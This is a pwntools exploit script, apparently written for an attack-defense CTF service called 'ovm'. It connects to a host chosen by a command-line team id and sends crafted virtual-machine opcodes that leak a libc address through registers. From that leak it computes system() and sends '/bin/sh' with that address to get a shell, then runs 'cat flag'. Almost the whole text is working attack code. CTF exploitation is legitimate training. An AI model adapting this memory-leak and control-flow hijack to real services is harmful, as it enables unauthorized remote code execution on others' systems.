#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'error'
execve_file = './ovm'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)

# host = '10.0.%s.2' % sys.argv[1]
# sh = remote(host, 10990)
# elf = ELF(execve_file)
# # libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    # b execute
    # b fetch
    b sendcomment
    b *$rebase(0xF24)
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def main(id):
    host = '10.0.%s.2' % id
    sh = remote(host, 10990)
    sh.sendlineafter('PC: ', '2')
    sh.sendlineafter('SP: ', '0')
    layout = [ # 1098
        u32((p8(0x10)+p8(0)+p8(0)+p8(8))[::-1]) ,
        u32((p8(0x10)+p8(1)+p8(1)+p8(0xff))[::-1]) ,
        u32((p8(0xc0)+p8(2)+p8(1)+p8(0))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0xc0)+p8(2)+p8(2)+p8(0))[::-1]) ,
        u32((p8(0x10)+p8(1)+p8(2)+p8(0xc6))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0x30)+p8(9)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,
        
        u32((p8(0x30)+p8(10)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0x10)+p8(1)+p8(5)+p8(0x10))[::-1]) ,
        u32((p8(0xc0)+p8(5)+p8(1)+p8(0))[::-1]) ,
        u32((p8(0x10)+p8(1)+p8(5)+p8(0x98))[::-1]) ,
        u32((p8(0x70)+p8(5)+p8(1)+p8(5))[::-1]) ,


        u32((p8(0x70)+p8(9)+p8(9)+p8(5))[::-1]) ,

        u32((p8(0x10)+p8(1)+p8(5)+p8(49))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(2)+p8(1))[::-1]) ,

        u32((p8(0x40)+p8(9)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0x10)+p8(1)+p8(2)+p8(1))[::-1]) ,
        u32((p8(0x70)+p8(2)+p8(1)+p8(2))[::-1]) ,

        u32((p8(0x40)+p8(10)+p8(1)+p8(2))[::-1]) ,


        u32((p8(0xff)+p8(0)+p8(0)+p8(0xff))[::-1]),
    ]
    sh.sendlineafter('CODE SIZE: ', str(len(layout)))
    sh.recvuntil('CODE: ')

    # pause()
    for v in layout:
        sh.sendline(str(v))
    sh.recvuntil('R9: ')
    low_byte = int(sh.recvuntil('\n'), 16)
    sh.recvuntil('R10: ')
    high_byte = int(sh.recvuntil('\n'), 16)

    system_addr = high_byte * 0x100000000 + low_byte - 0x39e4a0
    log.success('system_addr: ' + hex(system_addr))

    sh.send('/bin/sh\0' + p64(system_addr))
    sh.sendline('cat flag')
    sh.recvuntil('\x00By')
    return sh.recvuntil('\n')

if __name__ == "__main__":
    host = '10.0.%s.2' % sys.argv[1]
    print(main(sys.argv[1]))   
